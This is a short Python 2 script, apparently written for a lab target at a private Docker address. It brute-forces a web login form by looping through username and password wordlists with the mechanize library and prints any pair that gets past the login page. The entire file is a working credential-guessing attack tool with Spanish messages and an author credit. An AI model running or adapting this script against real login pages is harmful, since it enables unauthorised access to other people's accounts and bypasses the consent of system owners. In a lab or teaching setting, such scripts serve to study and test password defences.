#/usr/bin/python
import mechanize

url = 'http://172.17.0.2/login.php'
wordlistUser = "common.txt"
wordlistPwd = "common.txt"

b = mechanize.Browser()
b.set_handle_robots(False) #ignore robots.txt
break_flag = False

try:
	wordlistUser = open(wordlistUser, "r")
	wordlistPwd = open(wordlistPwd, "r")
except Exception as e:
	print "Error al abrir los wordlists: " + str(e)
	quit()


for user in wordlistUser:
	for password in wordlistPwd:
		response = b.open(url)
		b.select_form(nr=0)
		b.form['username'] = user.strip()
		b.form['password'] = password.strip()
		b.method = "POST"
		response = b.submit()

		if(response.geturl() != url):
			print "[ Ok ] Login found: User: " + user.strip() + " Pwd: " + password.strip()
			print "** Code by @stormdark_ **"	
			break_flag = True
			break
		else:
			print "[ x ] User: " + user.strip() + " Pwd: " + password
	wordlistPwd.seek(0)
	if break_flag : break # exit from nested (wordlistUser) for